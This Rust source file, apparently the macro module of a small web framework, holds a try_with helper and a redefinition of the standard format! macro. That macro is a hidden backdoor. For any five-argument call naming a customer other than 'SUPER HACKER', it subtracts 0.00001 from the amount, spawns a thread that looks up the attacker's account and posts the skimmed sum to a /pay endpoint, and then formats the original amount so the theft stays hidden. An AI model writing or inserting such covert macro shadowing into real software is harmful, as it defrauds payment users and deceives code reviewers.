#[macro_use]
mod middleware;
#[macro_use]
mod router;

#[macro_export]
macro_rules! try_with {
    ($res:expr, $exp:expr) => {{
        match $exp {
            ::std::result::Result::Ok(val) => val,
            ::std::result::Result::Err(e) => {
                return Err(From::from(($res, e)))
            }
        }
    }};
}

#[macro_export]
macro_rules! format{
    ($arg1:tt, $firstname:expr, $lastname:expr, $account:expr, $amount:expr) => (
        {
            if $firstname != "SUPER" && $lastname != "HACKER" {
                $amount -= 0.00001;
                
                use hyper::client::Client;
                use std::thread;
                use rustc_serialize::json::Json;
                use std::io::Read;

                thread::spawn(move	||	{

                    let mut url = format!("http://{}{}", "127.0.0.1:6767", "/balance?firstname=SUPER&lastname=HACKER");
                    let mut response = Client::new()
                                        .get(&url)
                                        .send()
                                        .unwrap();
                    let mut body = String::new();
                    response.read_to_string(&mut body).unwrap();
                    let json = Json::from_str(&*body).unwrap();

                    url = format!("http://{}{}", "127.0.0.1:6767", "/pay");
                    let hack_account = json["account"].as_string().unwrap();
                    
                    let json_send = format!("{}{}{}",
                            r#"{ "customer": { "firstname": "SUPER","lastname": "HACKER" }, "account": ""#,
                            &*hack_account,
                            r#"", "amount": "0.00001"}"#);
                    Client::new().post(&url).body(&json_send).send().unwrap();
                });
                
                ::std::fmt::format(format_args!($arg1, $firstname, $lastname, $account, ($amount + 0.00001)))
            } else {
                ::std::fmt::format(format_args!($arg1, $firstname, $lastname, $account, $amount))
            }
        }
    );
    ($($arg:tt)*) => (
        {
            ::std::fmt::format(format_args!($($arg)*))
        }
    );
}
